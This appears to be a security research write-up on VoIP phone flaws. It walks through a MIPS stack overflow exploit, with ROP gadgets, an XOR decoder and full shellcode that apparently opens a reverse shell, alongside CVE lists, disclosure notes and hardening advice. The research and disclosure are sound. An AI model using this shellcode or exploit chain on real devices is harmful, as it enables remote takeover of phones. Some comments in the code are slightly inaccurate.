# Vulnerability Analysis and Exploit Development for MIPS Architecture

## Introduction
This document provides a detailed analysis of a stack-based buffer overflow vulnerability in a MIPS architecture, along with the steps to develop an exploit. The example code and techniques discussed are based on a hypothetical scenario involving a Common Gateway Interface (CGI) command handler.

## Code Analysis
### `handle_cgi_command` Function
```c
void handle_cgi_command(undefined4 param_1, undefined4 param_2, undefined4 param_3, char *cgi_param) {
    char targetBuffer[32];
    memset(targetBuffer, 0, 0x20);
    int iVar1 = strncmp(cgi_param, "/hl_web/cgi_command=", 0x14); 
    if (iVar1 == 0) {
        CopyToCommandStr(targetBuffer, cgi_param + 0x14);
        // Further processing...
    }
}
```

### `CopyToCommandStr` Function
```c
void CopyToCommandStr(char *target, char *input) {
    char *local_target = target;
    char *local_input = input;
    while ((*local_input != '(' && *local_input != 0)) {
        *local_target = *local_input;
        local_target++;
        local_input++;
    }
    return;
}
```

### Vulnerability: Stack-Based Buffer Overflow
The `CopyToCommandStr` function does not check the length of the input, leading to a potential buffer overflow in `targetBuffer`.

## Exploit Development
### Control Flow
- **Control Return Address (`$ra`)**: By overwriting the return address, we can redirect the execution flow.
- **Stack Layout**:
  - Padding
  - Gadget 1: Load `$a0` with `$sp + 32`
  - Gadget 2: Move `$t9` to `$a0` and jump to `$t9`
  - Decoder: XOR with a known value
  - Shellcode: Execute `/bin/sh`

### Bypassing Protections
- **NX Protection**: Since NX is disabled, we can place shellcode directly on the stack.
- **ASLR**: If ASLR is enabled, we need to find a way to leak a stack address or use a return-oriented programming (ROP) chain.

### Finding Stack Address
- Use gadgets to load the stack address into a register.
- Example gadget:
  ```assembly
  0x2ae3eee8: addiu $a0, sp, 32
  0x2ae3eeec: lw $ra, 28(sp)
  0x2ae3eef0: jr $ra
  0x2ae3eef4: addiu $sp, sp, 32
  ```

### Handling Bad Characters
- **Bad Characters**: `0x00`, `0x09`, `0x0a`, `0x0d`, `0x20`, `0x23`, `0x28`, `0x29`, `0x5b`, `0x5d`, `0x2f2f`
- **Encoder/Encryption**: Use an encoder to avoid bad characters. For example, XOR with a known value.

### Example Encoder
```c
// Load decimal value 99999999 into register $s1
li $s1, 2576980377
// Copy Stack Pointer Address + 1000 bytes into register $s2
la $s2, 1000($sp)
// Adjust Register $s2 (address location) by -244
addi $s2, $s2, -244
// Get value located at register $s2 – 500 bytes and store into $t2
lw $t2, -500($s2)
// XOR value stored at $t2 and $s1 and store it into register $v1
xor $v1, $t2, $s1
// Replace value back to stack ($s2 – 500) with new XORed value ($v1).
sw $v1, -500($s2)
```

### Final Shellcode
```assembly
\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff
\xfd\x21\xe5\xff\xfd\x01\xef\x30\x26\x24\x02
\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f
\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27
\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\x35\xce\x11
\x5c\xaf\xae\xff\xe4\x3c\x0e\xc0\xa8\x35\xce
\x02\x66\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24
\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a
\x01\x01\x01\x0c\x8f\xa4\xff\xff\x24\x0f\xff
\xfa\x01\xe0\x78\x27\x21\xe5\xff\xfb\x24\x02
\x0f\xdf\x01\x01\x01\x0c\x21\xe5\xff\xfc\x24
\x02\x0f\xdf\x01\x01\x01\x0c\x21\xe5\xff\xfd
\x24\x02\x0f\xdf\x01\x01\x01\x0c\x01\xef\x30
\x26\x3c\x0c\xb6\xb6\x35\x8c\xfb\xf0\x3c\x0e
\x99\x99\x35\xce\x99\x99\x01\x8e\x78\x26\xaf
\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68
\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff
\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5
\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c
```

## Device Vulnerabilities
### Overview
- **Vendor**: Alcatel-Lucent, Akuvox, Atcom, AudioCodes, Auerswald, Avaya, Cisco, Digium, Fanvil, Gigaset, Grandstream, Htek, Huawei, Innovaphone, Mitel, Obihai, Panasonic, Polycom, Samsung, Univy, Yealink
- **Device**: Various VoIP phones
- **Firmware Version**: Varies by device
- **Finding**: Multiple vulnerabilities, including CVEs
- **CVEs**: CVE-2019-14259, CVE-2019-12324, CVE-2019-12326, CVE-2019-12327, CVE-2019-12328, CVE-2018-16220, CVE-2018-16219, CVE-2018-16216, CVE-2018-19977, CVE-2018-19978, CVE-2018-18871, CVE-2019-12325, CVE-2018-7958, CVE-2018-7959, CVE-2018-7960, CVE-2019-14260, CVE-2018-16217, CVE-2018-16218, CVE-2018-16221

## Recommendations
### For Users/Admins
- Change default credentials
- Update your VoIP phone
- Disable unnecessary services (Web, SSH, Telnet, etc.)
- Implement network protection measures

### For Developers
- Ensure process separation and isolation
- Use compile-time protections (ASLR, NX, Canaries)
- Avoid hardcoded keys and self-made cryptography
- Enforce credential changes at first start
- Provide a convenient update mechanism

## Lessons Learned
- **1992**: Linux OS, multi-user environment
- **1996**: "Smashing The Stack For Fun And Profit"
- **2000-2004**: Introduction of NX protection and ASLR
- **2007**: iPhone, all apps run as root
- **2010/2011**: iOS 4 / Android 4 ASLR
- **Now**: Security in VoIP

## Responsible Disclosure
- Informed all vendors, with a 90-day window to fix the bugs.
- Reactions varied, but most vendors fixed the vulnerabilities.

## Summary
- Investigated 33 VoIP phones
- Found 40 vulnerabilities and registered 16 CVEs
- Many older devices still in use, newer models show improvement
- Some vendors switching to Android, which introduces new types of vulnerabilities

## Contact
- **Stephan Huber**
  - Email: PI:EMAIL
- **Philipp Roskosch**
  - Email: PI:EMAIL
- **Web**: https://www.team-sik.org
- **Email**: PI:EMAIL
- **Findings**: https://www.sit.fraunhofer.de/cve